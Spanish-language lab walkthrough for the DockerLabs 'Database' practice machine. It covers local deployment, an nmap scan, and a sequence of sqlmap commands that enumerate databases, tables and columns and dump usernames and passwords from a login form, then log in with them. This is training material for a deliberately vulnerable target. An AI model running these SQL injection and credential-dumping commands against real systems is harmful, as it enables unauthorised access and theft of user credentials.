Maquinas a utilizar **Kali Linux y Database** [DockerLabs](https://dockerlabs.es/)

  

- Desplegamos la maquina victima de la siguiente manera.
    
    Lo llevamos al muestra maquina Kali Linux y lo descomprimimos en el escritorio. En una terminal escribimos el siguiente comando:
    
    ```Bash
    sudo bash auto_deploy.sh database.tar 
    ```
    
    ![[Imagenes/image 39.png|image 39.png]]
    
    Nos indica la IP de la maquina victima **172.17.0.2**. Sin cerrar este terminal abrimos otro para continuar con la inyección SQL.
    
      
    
    ```Bash
    nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
    ```
    
    ![[Imagenes/image 1 28.png|image 1 28.png]]
    
      
    
    No vemos ninguna **base de datos,** esto es normal por que **no necesariamente** la base de datos **tiene que estar expuesta**. Puede ser que que podamos acceder a una base de datos desde cualquier equipo o como en esta la base de datos no tenga el puerto abierto.
    
- En el navegador web ponemos la IP de la maquina victima. Nos encontramos ante un panel de Login. Aquí hay una base de datos que esta corriendo de forma interna y por eso no la veíamos expuesta.
    
    ![[Imagenes/image 2 27.png|image 2 27.png]]
    

  

- Aquí lo ideal es probar inyecciones SQL utilizando sqlmap.
    
    Vamos a meter un login erróneo por si nos mostrara el archivo en el que esta corriendo.
    
    ![[Imagenes/image 3 26.png|image 3 26.png]]
    

- Vamos a intentar encontrar las **bases de datos** existentes **.**
    
    ```Bash
    sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
    ```
    
    ![[Imagenes/image 4 25.png|image 4 25.png]]
    

  

- Toca el turno de las **tablas** en una de las bases de datos en este caso en la base de datos “register”.
    
    ```Bash
    sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch
    ```
    
    ![[Imagenes/image 5 24.png|image 5 24.png]]
    

- Tenemos la tabla “users”. Toca encontrar **columnas** dentro de esta tabla.
    
    ```Bash
    sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch
    ```
    
    ![[Imagenes/image 6 22.png|image 6 22.png]]
    
      
    
- Ya nos quedaría el ultimo paso que seria mostrar los **registros de las columnas**.
    
    ```Bash
    sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,username --dump --batch
    ```
    
    ![[Imagenes/image 7 20.png|image 7 20.png]]
    
      
    

- Vamos a probar las credenciales en el panel de login.
    
    ![[Imagenes/image 8 18.png|image 8 18.png]]
    
    ![[Imagenes/image 9 17.png|image 9 17.png]]